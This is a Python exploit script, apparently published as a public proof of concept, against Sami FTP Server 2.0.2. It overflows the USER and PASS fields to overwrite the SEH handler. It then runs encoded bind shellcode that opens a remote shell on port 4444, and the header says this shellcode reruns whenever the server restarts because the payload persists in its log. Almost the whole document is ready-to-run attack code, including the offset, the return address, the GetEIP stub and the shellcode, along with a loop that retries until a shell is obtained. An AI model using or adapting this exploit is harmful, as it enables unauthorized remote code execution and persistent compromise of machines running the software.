#/usr/bin/python
#-*- Coding: utf-8 -*-

### Sami FTP Server 2.0.2- SEH Overwrite, Buffer Overflow by n30m1nd ### 

# Date: 2016-01-11
# Exploit Author: n30m1nd
# Vendor Homepage: http://www.karjasoft.com/
# Software Link: http://www.karjasoft.com/files/samiftp/samiftpd_install.exe
# Version: 2.0.2
# Tested on: Win7 64bit and Win10 64 bit

# Credits
# =======
# Thanks to PHRACK for maintaining all the articles up for so much time... 
# These are priceless and still current for exploit development!!
# Shouts to the crew at Offensive Security for their huge efforts on making	the infosec community better

# How to
# ======
# * Open Sami FTP Server and open its graphical interface
# * Run this python script and write the IP to attack
# * Connect to the same IP on port 4444
#
# BONUS
# =====
# Since the program will write the data into its (SamiFTP.binlog) logs it will try to load these logs on each
# start and so, it will crash and run our shellcode everytime it starts.

# Why?
# ====
# The graphical interface tries to show the user name which produces an overflow overwriting SEH

# Exploit code
# ============

import socket
import struct

def doHavoc(ipaddr):
    # Bad chars: 00 0d 0a ff
    alignment = "\x90"*3
    
    jmpfront = "345A7504".decode('hex')
    #CPU Disasm
    #Hex dump          Command 
    #  34 5A           XOR AL,5A
    #  75 04           JNE SHORT +04
    
    # pop pop ret in tmp01.dll
    popret = 0x10022ADE
    
    # fstenv trick to get eip: phrack number 62
    # and store it into EAX for the metasploit shell (BufferRegister)
    getEIPinEAX = "D9EED934E48B44E40C040b".decode('hex')
    #CPU Disasm
    #Hex dump          Command
    #  D9EE            FLDZ
    #  D934E4          FSTENV SS:[ESP]
    #  8B44E4 0C       MOV EAX,DWORD PTR SS:[ESP+0C]
    #  04 0B           ADD AL,0B

    # Bind shellcode on port 4444 - alpha mixed BufferRegister=EAX
    shellcode = (
        getEIPinEAX + 
        "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIylm8mRS0UP7p"
        "e0K9jEDqYPU4Nk60VPlKCbdLnkbrWdLKqb4hfoNWczEvdqyoNLElpaalC2dl10kq"
        "xO6mEQ9WxbjRf22wNkf220lKsz5lNkblr1sHxcsxGqZqcaLK0YQ05QiCNkCyB8Hc"
        "VZ1Ynk5dlKEQyF01IoNLYQHOvm31yW6X9pRUXvwsSMIhgKqmDdT5KTf8NkaHWTEQ"
        "yCavNkDLBklKbx7lgqN3nkC4nkuQXPk9w47Tq4skaKsQV9pZPQkOYpcosobzNkWb"
        "8kNmSmbH5cP2C0Wpu8Qgd3UbCof4e80LD7ev379oyElxlP31GpWpFIo4V4bpCXa9"
        "op2KePyohURJFhPY0P8bimw0pPG0rpu8xjDOYOipYoiEj7QxWrC0wa3lmYZFbJDP"
        "qFqGCXYRIKDw3WkOZuv7CXNWkYehKOkOiEaGPhD4HlwKm1KOhUQGJ7BHRUpnrmqq"
        "Iokee83S2McT30oyXcQGV767FQIfcZfrv9PVYrImQvKwG4DdelvaGqLM0D5tDPO6"
        "GpRd0T602vaFF6w666rnqFsf2sPV0h2YzleoovYoXUK9kPrnSfPFYo00Ph7xk7wm"
        "sPYoKeMkxplulb2vsXoVmEOMomKO9EgL4FCLFjk0YkM0qec5Mkg7FsD2ROqzGpv3"
        "ioJuAA"
    )
    
    # Final payload, SEH overwrite ocurrs at 600 bytes
    payload = alignment + "."*(600-len(alignment)-len(jmpfront)) + jmpfront + struct.pack("<L", popret) + shellcode
    try:
        s = socket.create_connection((ipaddr, 21))
        s.send("USER "+ payload +"\r\n" )
        print s.recv(4096)
        
        s.send("PASS "+ payload +"\r\n" )
        print s.recv(4096)
        print s.recv(4096)
    except e:
        print str(e)
        exit("[+] Couldn't connect")
            
if __name__ == "__main__":
    ipaddr = raw_input("[+] IP: ")
    doHavoc(ipaddr)
    while raw_input("[?] Got shell?(y/n) ").lower() == "n":
        doHavoc(ipaddr)
    print "[+] Enjoy..."